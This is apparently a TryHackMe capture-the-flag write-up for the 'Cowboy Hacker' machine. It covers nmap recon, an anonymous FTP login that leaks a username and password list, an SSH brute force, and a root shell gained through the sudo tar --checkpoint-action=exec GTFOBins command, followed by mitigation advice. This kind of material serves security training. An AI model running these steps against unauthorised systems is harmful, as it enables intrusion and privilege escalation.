# Cowboy Hacker — TryHackMe

**Platform:** TryHackMe
**Machine:** Cowboy Hacker
**OS:** Linux
**Date:** 20/07/2026
**Tags:** #recon #CTF
**Status:** Completed ✅

## TL;DR

Initial access abuses an **FTP server (vsftpd 3.0.5) with anonymous login enabled**. Two plaintext files were sitting in the FTP root — `task.txt`, revealing a system username (`lin`), and `locks.txt`, containing a list of candidate passwords. With those two artifacts it was possible to build a credential brute force against the **SSH** service, gaining initial access as `lin` and the user flag.

Privilege escalation abuses a misconfigured `sudo -l` entry: the `lin` user can run `/bin/tar` as root with no argument restrictions via the sudo policy. `tar` has a documented **GTFOBins** technique (`--checkpoint`/`--checkpoint-action=exec=`) that lets you execute an arbitrary command during the archiving operation — since the process runs with sudo's elevated context, the command executes as root, allowing `root.txt` to be read and full compromise of the machine.

**Attack chain:** FTP anonymous login → Username/passwords leaked in plaintext files → SSH brute force → Access as `lin` → `sudo -l` (unrestricted tar) → GTFOBins (`tar --checkpoint-action=exec=`) → root

---

## 1. Recon

### 1.1 Nmap enumeration

Target IP: `10.64.166.178`

```
# Nmap 7.99 scan initiated Tue Jul 21 14:41:50 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN cowboyhacker.txt 10.64.166.178
Nmap scan report for 10.64.166.178
Host is up (0.14s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.155.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:3d:22:ab:36:61:82:36:d8:b1:21:3a:12:94:fa:4f (RSA)
|   256 06:f0:33:69:91:11:e6:5b:53:a9:ab:91:22:2e:3b:4b (ECDSA)
|_  256 e3:6f:92:12:10:e9:07:68:f8:1c:32:9e:5a:a7:e1:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 21 14:42:16 2026 -- 1 IP address (1 host up) scanned in 25.62 seconds
```

Three open ports: **FTP (21)** running vsftpd 3.0.5 with **anonymous login allowed** (`ftp-anon: Anonymous FTP login allowed`), **SSH (22)** running OpenSSH 8.2p1, and **HTTP (80)** running Apache 2.4.41. The anonymous FTP is the most obvious entry point and was the first vector explored.

---

## 2. Foothold

### 2.1 Anonymous FTP login

```
┌──(gabriel㉿gabriel)-[~/Documents/Study/cowboyhacker]
└─$ ftp 10.64.166.178
Connected to 10.64.166.178.
220 (vsFTPd 3.0.5)
Name (10.64.166.178:gabriel): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |***************************************************************************************|   418        7.38 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.65 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |***************************************************************************************|    68        2.02 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.46 KiB/s)
ftp> exit
221 Goodbye.
```

Logging in as `anonymous` was accepted immediately, allowing two files to be downloaded: `locks.txt` and `task.txt`. `task.txt` contained a system username (`lin`), and `locks.txt` held a list of candidate passwords in plaintext.

> **Point of interest:** never store passwords in plaintext anywhere reachable, especially on an FTP server with anonymous access enabled.

### 2.2 SSH brute force and access as `lin`

With the username (`lin`) and the password wordlist (`locks.txt`) in hand, a brute force attack against the SSH service was set up, yielding valid access to the system as `lin`.

With the SSH session established, it was possible to read `user.txt` and capture the challenge's user flag.

---

## 3. Privilege escalation

### 3.1 Enumerating sudo permissions

The first attempt at locating `root.txt` through a direct search failed — the file requires elevated permissions to be found and read:

```
find / -name root* 2>/dev/null
find / -iname "root*" 2>/dev/null
```

Moving on to enumerating `lin`'s privileges:

```
lin@ip-10-64-166-178:~/.local$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-64-166-178:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-64-166-178:
    (root) /bin/tar
```

The `lin` user can run `/bin/tar` as root via `sudo`, with no argument restrictions whatsoever. `tar` is a well-known entry in the **GTFOBins** database: it has a checkpoint flag (`--checkpoint`) capable of triggering an arbitrary command (`--checkpoint-action=exec=`) during the archiving operation. Since the process runs with root privileges via sudo, the executed command inherits that same context.

### 3.2 Exploiting `tar`'s GTFOBins entry → root

Syntax used:

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Full execution and reading the final flag:

```
lin@ip-10-64-166-178:~/.local$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cat /root/root.txt
THM{80UN...K3r}
# Connection to 10.64.166.178 closed by remote host.
Connection to 10.64.166.178 closed.
```

---

## 4. Root cause & mitigation

| # | Vulnerability | Root cause | Mitigation |
|---|---|---|---|
| 1 | Anonymous FTP exposing sensitive data | vsftpd configured to allow `anonymous` login, exposing a directory with files containing a username and a plaintext password list | Disable anonymous FTP login (or migrate to SFTP/FTPS); never store credentials in plaintext on any reachable service |
| 2 | Weak/reused passwords enabling SSH brute force | No lockout/rate-limiting policy on login attempts, and the password was present in a guessable wordlist | Implement `fail2ban` or equivalent, require MFA for SSH, enforce a strong and unique password policy |
| 3 | Overly permissive `sudo` rule | `lin` authorized to run `/bin/tar` as root with no argument restrictions, enabling abuse via GTFOBins | Never grant unrestricted `sudo` on binaries with built-in command-execution features (`tar`, `less`, `vim`, `find`, etc.); use `sudo` with fixed/whitelisted arguments or scoped capabilities instead of the full binary |

---

## 5. Lessons learned

- FTP services with anonymous login enabled are, in practice, a public directory — any file stored there should be treated as publicly exposed.
- Never store credentials (usernames, passwords, wordlists) in plaintext anywhere reachable by network services, even if it seems like a "hidden" spot.
- Before granting any `sudo` rule, check the target binary against **GTFOBins** — many legitimate utilities (`tar`, `find`, `less`, `vim`, `awk`) have built-in shell/exec features that completely break privilege isolation.
- Apply zero-trust to every user, even those who already have valid access to the system.
